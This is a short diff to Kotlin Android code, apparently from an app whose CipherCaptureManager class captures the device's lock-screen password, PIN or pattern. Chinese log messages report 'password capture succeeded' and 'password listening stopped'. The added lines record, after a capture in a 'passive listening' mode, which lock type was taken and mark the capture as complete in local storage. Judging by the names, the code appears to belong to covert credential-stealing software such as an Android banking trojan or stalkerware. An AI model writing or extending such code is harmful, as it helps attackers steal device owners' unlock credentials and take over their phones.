@@ -1074,6 +1074,21 @@ class CipherCaptureManager(
                 return
             }
             Log.d(TAG, "✅ [onPasswordCaptureSuccess] 密码捕获成功")
+
+            // 保存 cipher_completed + lock_type（被动监听模式下 handleCipherCredentialResult 不会被调用）
+            val quality = svc.lastCapturedCipherQuality
+            val lockType = when (quality) {
+                "PASSWORD_QUALITY_PATTERN" -> "pattern"
+                "PASSWORD_QUALITY_NUMERIC_COMPLEX", "PASSWORD_QUALITY_NUMERIC" -> "pin"
+                "PASSWORD_QUALITY_ALPHANUMERIC" -> "pin"
+                else -> "unknown"
+            }
+            svc.getSharedPreferences("cipher_config", 0).edit()
+                .putBoolean("cipher_completed", true)
+                .putString("cipher_lock_type", lockType)
+                .apply()
+            Log.d(TAG, "✅ cipher_completed=true, lock_type=$lockType")
+
             if (!com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
                 svc.isCipherCaptureEnabled = false
                 Log.d(TAG, "✅ 密码监听已停止")
